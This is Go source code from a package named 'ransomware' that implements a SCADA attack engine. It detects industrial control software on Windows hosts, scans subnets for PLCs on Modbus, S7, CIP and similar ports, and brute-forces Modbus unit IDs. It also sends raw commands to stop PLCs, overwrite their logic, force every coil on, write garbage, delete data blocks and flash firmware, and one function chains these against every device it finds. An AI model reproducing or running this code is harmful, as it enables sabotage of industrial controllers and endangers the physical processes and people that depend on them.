package ransomware

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	// "strings"
	"time"
)

type SCADAAttackEngine struct {
	config      *RansomwareConfig
	PLCDetected []PLCDevice  `json:"plc_detected"`
	ModbusPorts []int        `json:"modbus_ports"`
	ScadaApps  []string     `json:"scada_apps"`
}

type PLCDevice struct {
	IP       string `json:"ip"`
	Port     int    `json:"port"`
	Vendor   string `json:"vendor"`
	Model    string `json:"model"`
	Protocol string `json:"protocol"`
	Attacked bool   `json:"attacked"`
}

type SCADACommand struct {
	PLC     PLCDevice `json:"plc"`
	Action  string    `json:"action"`
	Payload []byte    `json:"payload"`
}

var scadaApplications = []string{
	"STEP7.exe", "WINCC.exe", "TIA_Portal.exe", "S7-PLCSIM.exe",
	"RSLogix5000.exe", "RSLinx.exe", "FactoryTalk.exe",
	"CODESYS.exe", "TwinCAT.exe", "ISaGRAF.exe",
	"EcavaIntegraXor.exe", "ClearSCADA.exe", "VijeoDesigner.exe",
	"Proficy.exe", "Cimplicity.exe", "iFix.exe",
	"Wonderware.exe", "SystemPlatform.exe", "InTouch.exe",
}

var knownPLCPorts = []int{502, 102, 20000, 44818, 4840, 2404, 2222, 20547, 34962, 34963, 34964}

func NewSCADAAttackEngine(cfg *RansomwareConfig) *SCADAAttackEngine {
	return &SCADAAttackEngine{
		config:      cfg,
		ModbusPorts: []int{502},
		ScadaApps:   scadaApplications,
	}
}

func (se *SCADAAttackEngine) DetectSCADASoftware() []string {
	var found []string

	for _, app := range se.ScadaApps {
		if _, err := exec.LookPath(app); err == nil {
			found = append(found, app)
		}
	}

	if runtime.GOOS == "windows" {
		for _, app := range se.ScadaApps {
			checkCmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", app))
			if output, err := checkCmd.Output(); err == nil && len(output) > 5 {
				found = append(found, fmt.Sprintf("running_%s", app))
			}
		}
	}

	progFiles := []string{
		`C:\Program Files\Siemens\`, `C:\Program Files (x86)\Siemens\`,
		`C:\Program Files\Rockwell Automation\`, `C:\Program Files\Schneider Electric\`,
		`C:\Program Files\CODESYS\`, `C:\Program Files\Beckhoff\`,
		`C:\Program Files\Wonderware\`, `C:\Program Files\GE Automation\`,
	}

	for _, dir := range progFiles {
		expanded := os.ExpandEnv(dir)
		if info, err := os.Stat(expanded); err == nil && info.IsDir() {
			found = append(found, fmt.Sprintf("installed_%s", filepath.Base(dir)))
		}
	}

	return found
}

func (se *SCADAAttackEngine) ScanForPLCs(cidr string) []PLCDevice {
	var plcs []PLCDevice

	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		ip = net.ParseIP("192.168.1.0")
		ipnet = &net.IPNet{IP: ip, Mask: net.CIDRMask(24, 32)}
	}

	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
		if ip.Equal(ipnet.IP) || ip.Equal(net.IP{255, 255, 255, 255}) {
			continue
		}
		hostIP := ip.String()

		for _, port := range knownPLCPorts {
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", hostIP, port), 500*time.Millisecond)
			if err != nil {
				continue
			}
			conn.Close()

			plc := PLCDevice{
				IP:       hostIP,
				Port:     port,
				Vendor:   se.identifyPLCVendor(port, hostIP),
				Model:    se.identifyPLCModel(port),
				Protocol: se.identifyPLCProtocol(port),
			}

			if se.probeModbus(hostIP) {
				plc.Protocol = "modbus"
			}
			if se.probeS7(hostIP) {
				plc.Protocol = "s7comm"
			}

			plcs = append(plcs, plc)
			break
		}
	}

	se.PLCDetected = append(se.PLCDetected, plcs...)
	return plcs
}

func (se *SCADAAttackEngine) probeModbus(ip string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:502", ip), 1*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(2 * time.Second))

	req := []byte{
		0x00, 0x01, 0x00, 0x00, 0x00, 0x06,
		0xFF, 0x03, 0x00, 0x00, 0x00, 0x01,
	}
	conn.Write(req)

	resp := make([]byte, 256)
	n, _ := conn.Read(resp)
	return n > 0 && resp[7] == 0x03
}

func (se *SCADAAttackEngine) probeS7(ip string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:102", ip), 1*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(2 * time.Second))

	s7req := []byte{
		0x03, 0x00, 0x00, 0x16, 0x11, 0xE0, 0x00, 0x00,
		0x00, 0x01, 0x00, 0xC0, 0x01, 0x0A, 0x01, 0x02,
		0x01, 0x00, 0x02, 0x00, 0x01, 0x00,
	}
	conn.Write(s7req)

	resp := make([]byte, 256)
	n, _ := conn.Read(resp)
	return n > 0 && resp[5] == 0xE0
}

func (se *SCADAAttackEngine) identifyPLCVendor(port int, ip string) string {
	vendorMap := map[int]string{
		502:  "Schneider Electric",
		102:  "Siemens",
		20000: "Rockwell Automation",
		44818: "Rockwell Automation",
		4840: "OPC Foundation",
		2404: "Mitsubishi",
		2222: "Beckhoff",
		20547: "ProConOS",
	}
	if vendor, ok := vendorMap[port]; ok {
		return vendor
	}
	return "Unknown"
}

func (se *SCADAAttackEngine) identifyPLCModel(port int) string {
	modelMap := map[int]string{
		502:  "Modicon M340/M580",
		102:  "S7-1200/S7-1500",
		20000: "ControlLogix L8x",
		44818: "CompactLogix",
		4840: "OPC UA Server",
		2404: "MELSEC-Q/L",
		2222: "TwinCAT 2/3",
		20547: "ProConOS 4.0",
	}
	if model, ok := modelMap[port]; ok {
		return model
	}
	return "Generic PLC"
}

func (se *SCADAAttackEngine) identifyPLCProtocol(port int) string {
	protoMap := map[int]string{
		502:  "Modbus TCP",
		102:  "S7 Comm",
		20000: "CIP",
		44818: "EtherNet/IP",
		4840: "OPC UA",
		2404: "SLMP",
		2222: "ADS",
		20547: "ProConOS",
	}
	if proto, ok := protoMap[port]; ok {
		return proto
	}
	return "Unknown"
}

func (se *SCADAAttackEngine) SendCommand(plc PLCDevice, action string) error {
	cmd := SCADACommand{
		PLC:    plc,
		Action: action,
	}

	switch plc.Protocol {
	case "modbus":
		return se.sendModbusCommand(cmd)
	case "s7comm":
		return se.sendS7Command(cmd)
	case "cip":
		return se.sendCIPCommand(cmd)
	default:
		return se.sendGenericSCADACommand(cmd)
	}
}

func (se *SCADAAttackEngine) sendModbusCommand(cmd SCADACommand) error {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", cmd.PLC.IP, cmd.PLC.Port), 5*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	switch cmd.Action {
	case "stop_plc":
		cmd.Payload = []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0xFF, 0x10, 0x00, 0x01, 0x00, 0x01, 0x02, 0x00, 0x00}
	case "override_output":
		cmd.Payload = []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x10, 0x02, 0xFF, 0xFF}
	case "write_coil_all":
		cmd.Payload = []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0xFF, 0x05, 0x00, 0x00, 0xFF, 0x00}
	case "overwrite_logic":
		cmd.Payload = make([]byte, 256)
		for i := 0; i < 256; i++ {
			cmd.Payload[i] = byte(i)
		}
	case "read_all_registers":
		cmd.Payload = []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0xFF, 0x03, 0x00, 0x00, 0x00, 0x64}
	}

	_, err = conn.Write(cmd.Payload)
	return err
}

func (se *SCADAAttackEngine) sendS7Command(cmd SCADACommand) error {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", cmd.PLC.IP, cmd.PLC.Port), 5*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	var payload []byte
	switch cmd.Action {
	case "stop_plc":
		payload = []byte{0x03, 0x00, 0x00, 0x25, 0x02, 0xF0, 0x80, 0x72, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	case "write_garbage":
		payload = make([]byte, 512)
		for i := range payload {
			payload[i] = 0xFF
		}
	case "db_delete":
		payload = []byte{0x03, 0x00, 0x00, 0x1C, 0x02, 0xF0, 0x80, 0x72, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	case "flash_firmware":
		payload = make([]byte, 1024)
		payload[0] = 0x03
		payload[1] = 0x00
	default:
		payload = []byte{0x03, 0x00, 0x00, 0x16, 0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00, 0xC1, 0x02, 0x10, 0x00, 0xC2, 0x02, 0x00, 0x01, 0xC0, 0x01, 0x0A}
	}

	_, err = conn.Write(payload)
	return err
}

func (se *SCADAAttackEngine) sendCIPCommand(cmd SCADACommand) error {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", cmd.PLC.IP, cmd.PLC.Port), 5*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	cipPayload := make([]byte, 200)
	cipPayload[0] = 0x00
	cipPayload[1] = 0x00
	cipPayload[2] = 0x00
	cipPayload[3] = 0x00
	cipPayload[4] = 0x00
	cipPayload[5] = byte(len(cipPayload) - 6)
	cipPayload[6] = 0x01

	_, err = conn.Write(cipPayload)
	return err
}

func (se *SCADAAttackEngine) sendGenericSCADACommand(cmd SCADACommand) error {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", cmd.PLC.IP, cmd.PLC.Port), 5*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	garbage := make([]byte, 1500)
	for i := range garbage {
		garbage[i] = 0xFF
	}
	_, err = conn.Write(garbage)
	return err
}

func (se *SCADAAttackEngine) OverwriteAllPLCLogic(plcs []PLCDevice) []PLCDevice {
	var attacked []PLCDevice
	for _, plc := range plcs {
		se.SendCommand(plc, "stop_plc")
		time.Sleep(200 * time.Millisecond)
		se.SendCommand(plc, "overwrite_logic")
		time.Sleep(100 * time.Millisecond)
		se.SendCommand(plc, "write_coil_all")

		plc.Attacked = true
		attacked = append(attacked, plc)
	}
	return attacked
}

func (se *SCADAAttackEngine) BruteForceModbus(ip string) string {
	unitIDs := []byte{1, 2, 3, 10, 100, 255}
	for _, uid := range unitIDs {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:502", ip), 2*time.Second)
		if err != nil {
			continue
		}
		defer conn.Close()
		conn.SetDeadline(time.Now().Add(3 * time.Second))

		req := []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, uid, 0x01, 0x00, 0x00, 0x00, 0x01}
		conn.Write(req)
		resp := make([]byte, 256)
		n, _ := conn.Read(resp)
		if n > 0 && resp[0] == 0x00 && resp[1] == 0x01 {
			return fmt.Sprintf("unit_id_%d", uid)
		}
	}
	return "no_access"
}

func (se *SCADAAttackEngine) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"plc_detected": se.PLCDetected,
		"scada_apps":   se.DetectSCADASoftware(),
	})
	return string(data)
}
